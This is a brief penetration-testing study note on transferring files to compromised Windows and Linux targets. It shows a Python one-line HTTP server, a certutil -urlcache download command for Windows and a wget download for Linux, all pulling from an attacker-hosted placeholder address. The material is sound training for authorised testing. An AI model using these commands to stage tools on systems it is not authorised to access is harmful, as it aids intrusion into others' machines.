# 4 - Transferring Files to Windows & Linux Targets

## <mark style="color:red;">Setting Up A Web Server With Python</mark>

* After obtaining initial access to a target system, you will need to transfer files to the target system.
* In some cases, you will not have access to the target system via a Meterpreter session, and as a result, you will need to use the inbuilt OS specific utilities to facilitate the transfer of files from your system to the target system.
* This process utilizes a two-step approach, where you will need to host the files you want to transfer on a web server and download the files hosted on the web server to the target system.

### **Setting Up a Web Server With Python**

* Python comes with a built-in module known as <mark style="color:yellow;">SimpleHTTPServer</mark> (Python2) and <mark style="color:yellow;">http.server</mark> (Python3), that can be used to facilitate a simple HTTP server that gives you standard GET and HEAD request handlers.
* This module can be used to host files in any directory of your system. And can be implemented through a single command in your terminal.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
python -m SimpleHTTPServer <localPort> #Set up a python2 web server
python3 -m http.server <localPort> #Set up a python3 web server
```
{% endcode %}

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
cmd > certutil -urlcache -f http://<localIP>/<file> <newNameFile> #Download a file on Windows with certutil
```
{% endcode %}

### **Practical Demonstration**

```bash
shell > wget http://<localIP>/<file> #Download a file on Linux using wget
```
